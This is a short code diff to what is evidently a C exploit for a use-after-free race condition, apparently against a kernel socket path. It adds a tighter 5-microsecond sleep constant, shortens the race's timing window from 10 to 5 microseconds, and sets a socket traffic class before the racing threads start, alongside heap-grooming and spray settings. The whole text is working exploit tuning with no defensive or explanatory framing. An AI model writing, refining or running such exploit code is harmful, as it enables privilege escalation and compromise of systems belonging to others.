@@ -28,6 +28,7 @@
 #define NANOSLEEP_50US  "\0\0\0\0\0\0\0\0\x50\xc3\0\0\0\0\0\0"
 #define NANOSLEEP_25US  "\0\0\0\0\0\0\0\0\xa8\x61\0\0\0\0\0\0"
 #define NANOSLEEP_10US  "\0\0\0\0\0\0\0\0\x10\x27\0\0\0\0\0\0"
+#define NANOSLEEP_5US    "\0\0\0\0\0\0\0\0\x88\x13\0\0\0\0\0\0"
 
 #define MAX_ATTEMPTS 5
 #define HEAP_GROOM_COUNT 100
@@ -250,14 +251,14 @@ void* free_thread(void* arg) {
 
 void trigger_uaf(struct opaque* o) {
     pin_to_cpu(1);
-
+    set_tclass(o->master_sock, 0);
     o->triggered = o->padding = o->done1 = o->done2 = 0;
 
     pthread_t th1, th2;
     pthread_create(&th1, NULL, use_thread, o);
     pthread_create(&th2, NULL, free_thread, o);
 
-    nanosleep(NANOSLEEP_10US, NULL); // Critical timing window for race condition
+    nanosleep(NANOSLEEP_5US, NULL); // Critical timing window for race condition
 
     const int MAX_SPRAY = SPRAY_SIZE;
     int attempts = 0;
